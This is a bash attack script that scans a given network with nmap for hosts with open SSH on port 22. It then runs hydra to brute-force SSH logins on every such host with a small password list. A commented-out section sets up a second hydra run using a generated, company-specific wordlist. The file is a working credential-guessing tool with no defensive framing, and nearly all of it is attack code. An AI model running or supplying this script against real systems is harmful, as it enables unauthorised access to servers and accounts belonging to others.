#!/bin/bash
NETWORK="$1"
USERNAME="$2"

echo "Network: $NETWORK"
echo "Username: $USERNAME"

TEN_PASSWORD_LIST="best10.txt"
TEN_THOUSAND_PASSWORD_LIST="10-million-password-list-top-10000.txt"

TARGET_FILE="targets.txt"
CRACKED_FILE="cracked.txt"

echo "Welcome to Nmap-Hydra Script"

echo "TARGETING SSH PORT 22"
PORT=22
SERVICE=ssh

# run one general NMAP script - all known ports
# -> pipe that info to file to correlate targets ip to port / protocol







echo "We are scanning live hosts in your network..."
nmap -p $PORT -Pn -oG temp_nmap_scan $NETWORK >/dev/null
if [ -f temp_nmap_scan ]; then
  cat temp_nmap_scan | grep $PORT/open | awk '{print $2}' > $TARGET_FILE
  rm temp_nmap_scan
else
  echo "Nmap scan failed or returned no results. Aborting."
  exit 1
fi

echo "10 Passwords Scan"
echo "hydra -l \"$USERNAME\" -P \"$TEN_PASSWORD_LIST\" -s \"$PORT\" -o \"result:json\" -M \"$TARGET_FILE\" \"$SERVICE\" " 
hydra -l "$USERNAME" -P "$TEN_PASSWORD_LIST" -s "$PORT" -o result:json -M "$TARGET_FILE" "$SERVICE"


# echo "Custom Scan"
# echo "Debug: Starting pydictor_generator.sh"
# ./pydictor_generator.sh $COMPANY_NAME
# # Check if the pydictor_generator.sh script executed successfully
# if [ $? -ne 0 ]; then
#   echo "pydictor_generator.sh script failed. Aborting."
#   exit 1
# fi

# PD_PASSWORD_LIST="./pydictor/passwords.txt"

# echo "hydra –l \"$USERNAME\" -P $PD_PASSWORD_LIST -t 4 -s $PORT -o $CRACKED_FILE -M $TARGET_FILE $SERVICE" 
# hydra -l "$USERNAME" -P $PD_PASSWORD_LIST -t 4 -s $PORT -o $CRACKED_FILE -M $TARGET_FILE $SERVICE 

# if [ -f ./pydictor/passwords.txt ]; then
#   rm ./pydictor/passwords.txt
# else
#   echo "File not found here."
# fi


